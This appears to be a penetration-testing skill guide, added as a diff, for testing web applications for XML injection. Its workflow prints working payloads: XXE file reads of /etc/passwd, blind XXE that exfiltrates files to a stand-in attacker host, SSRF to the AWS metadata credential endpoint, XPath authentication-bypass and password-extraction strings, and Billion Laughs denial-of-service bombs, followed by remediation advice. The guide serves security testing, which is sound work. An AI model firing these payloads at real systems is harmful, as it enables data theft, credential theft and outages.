@@ -1,0 +1,250 @@
+\title{Testing For Xml Injection Vulnerabilities}
+
+\taxon{skill}
+
+\tag{xml-injection}
+
+\tag{xxe}
+
+\tag{xpath-injection}
+
+\tag{xml-parsing}
+
+\tag{web-security}
+
+\tag{entity-injection}
+
+\tag{dtd-attack}
+
+\meta{version}{"1.0"}
+
+\meta{description}{Test web applications for XML injection vulnerabilities including XXE, XPath injection, and XML entity attacks to identify data exposure and server-side request forgery risks.}
+
+\subtree{
+\title{Testing for XML Injection Vulnerabilities}
+\subtree{
+\title{When to Use}
+\ul{
+\li{When testing applications that process XML input (SOAP APIs, XML-RPC, file uploads)}
+\li{During penetration testing of applications with XML parsers}
+\li{When assessing SAML-based authentication implementations}
+\li{When testing file import/export functionality that handles XML formats}
+\li{During API security testing of SOAP or XML-based web services}
+}
+}
+
+\subtree{
+\title{Prerequisites}
+\ul{
+\li{Burp Suite with XML-related extensions (Content Type Converter, XXE Scanner)}
+\li{XMLLint or similar XML validation tools}
+\li{Understanding of XML structure, DTDs, and entity processing}
+\li{Python 3.x with lxml and requests libraries}
+\li{Access to an out-of-band interaction server (Burp Collaborator, interact.sh)}
+\li{Sample XXE payloads from PayloadsAllTheThings repository}
+}
+}
+
+\subtree{
+\title{Workflow}
+\subtree{
+\title{Step 1 — Identify XML Processing Endpoints}
+\pre{\startverb
+# Look for endpoints accepting XML content types
+# Content-Type: application/xml, text/xml, application/soap+xml
+# Check WSDL files for SOAP services
+curl -s http://target.com/service?wsdl
+
+# Test if endpoint accepts XML by changing Content-Type
+curl -X POST http://target.com/api/data \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><root><test>hello</test></root>'
+
+# Check for XML file upload functionality
+# Look for .xml, .svg, .xlsx, .docx file processing
+\stopverb}
+}
+
+\subtree{
+\title{Step 2 — Test for Basic XXE (File Retrieval)}
+\pre{\startverb
+<!-- Basic XXE to read local files -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root><data>&xxe;</data></root>
+
+<!-- Windows file retrieval -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<root><data>&xxe;</data></root>
+
+<!-- Using PHP wrapper for base64-encoded file content -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<root><data>&xxe;</data></root>
+\stopverb}
+}
+
+\subtree{
+\title{Step 3 — Test for Blind XXE with Out-of-Band Detection}
+\pre{\startverb
+<!-- Out-of-band XXE using external DTD -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker-server.com/xxe.dtd">
+  %xxe;
+]>
+<root><data>test</data></root>
+
+<!-- External DTD file (xxe.dtd hosted on attacker server) -->
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker-server.com/?data=%file;'>">
+%eval;
+%exfil;
+
+<!-- DNS-based out-of-band detection -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://xxe-test.burpcollaborator.net">
+]>
+<root><data>&xxe;</data></root>
+\stopverb}
+}
+
+\subtree{
+\title{Step 4 — Test for SSRF via XXE}
+\pre{\startverb
+<!-- Internal network scanning via XXE -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root><data>&xxe;</data></root>
+
+<!-- AWS metadata endpoint access -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+]>
+<root><data>&xxe;</data></root>
+
+<!-- Internal port scanning -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
+]>
+<root><data>&xxe;</data></root>
+\stopverb}
+}
+
+\subtree{
+\title{Step 5 — Test for XPath Injection}
+\pre{\startverb
+# Basic XPath injection in search parameters
+curl "http://target.com/search?query=' or '1'='1"
+
+# XPath authentication bypass
+curl -X POST http://target.com/login \
+  -d "username=' or '1'='1&password=' or '1'='1"
+
+# XPath data extraction
+curl "http://target.com/search?query=' or 1=1 or ''='"
+
+# Blind XPath injection with boolean-based extraction
+curl "http://target.com/search?query=' or string-length(//user[1]/password)=8 or ''='"
+curl "http://target.com/search?query=' or substring(//user[1]/password,1,1)='a' or ''='"
+\stopverb}
+}
+
+\subtree{
+\title{Step 6 — Test for XML Billion Laughs (DoS)}
+\pre{\startverb
+<!-- Billion Laughs attack (use only in authorized testing) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<root><data>&lol4;</data></root>
+
+<!-- Quadratic blowup attack -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
+]>
+<root>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</root>
+\stopverb}
+}
+}
+
+\subtree{
+\title{Key Concepts}
+\pre{\startverb
+| Concept | Description |
+|---------|-------------|
+| XXE (XML External Entity) | Attack exploiting XML parsers that process external entity references |
+| Blind XXE | XXE where response is not reflected; requires out-of-band channels |
+| XPath Injection | Injection into XPath queries used to navigate XML documents |
+| DTD (Document Type Definition) | Declarations that define XML document structure and entities |
+| Parameter Entities | Special entities (%) used within DTDs for blind XXE exploitation |
+| SSRF via XXE | Using XXE to make server-side requests to internal resources |
+| XML Bomb | Denial of service via recursive entity expansion (Billion Laughs) |
+\stopverb}
+}
+
+\subtree{
+\title{Tools & Systems}
+\pre{\startverb
+| Tool | Purpose |
+|------|---------|
+| Burp Suite | HTTP proxy with XXE Scanner extension for automated detection |
+| XXEinjector | Automated XXE injection and data exfiltration tool |
+| OXML_XXE | Tool for embedding XXE payloads in Office XML documents |
+| xmllint | XML validation and parsing utility for payload testing |
+| interact.sh | Out-of-band interaction server for blind XXE detection |
+| Content Type Converter | Burp extension to convert JSON requests to XML for XXE testing |
+\stopverb}
+}
+
+\subtree{
+\title{Common Scenarios}
+\ol{
+\li{\strong{File Disclosure} — Read sensitive server files (/etc/passwd, web.config) through classic XXE entity injection in XML input fields}
+\li{\strong{SSRF to Cloud Metadata} — Access AWS/GCP/Azure metadata endpoints through XXE to steal IAM credentials and access tokens}
+\li{\strong{Blind Data Exfiltration} — Extract sensitive data through out-of-band DNS/HTTP channels when XXE output is not reflected}
+\li{\strong{SAML XXE} — Inject XXE payloads into SAML assertions during single sign-on authentication flows}
+\li{\strong{SVG File Upload XXE} — Upload malicious SVG files containing XXE payloads to trigger server-side XML parsing}
+}
+}
+
+\subtree{
+\title{Output Format}
+\pre{\startverb
+## XML Injection Assessment Report
+- **Target**: http://target.com/api/xml-endpoint
+- **Vulnerability Types Found**: XXE, Blind XXE, XPath Injection
+- **Severity**: Critical
+
+### Findings
+| # | Type | Endpoint | Payload | Impact |
+|---|------|----------|---------|--------|
+| 1 | XXE File Read | POST /api/import | SYSTEM "file:///etc/passwd" | Local File Disclosure |
+| 2 | Blind XXE | POST /api/upload | External DTD with OOB | Data Exfiltration |
+| 3 | SSRF via XXE | POST /api/parse | SYSTEM "http://169.254.169.254/" | Cloud Credential Theft |
+
+### Remediation
+- Disable external entity processing in XML parser configuration
+- Use JSON instead of XML where possible
+- Implement XML schema validation with strict DTD restrictions
+- Block outbound connections from XML processing services
+\stopverb}
+}
+}
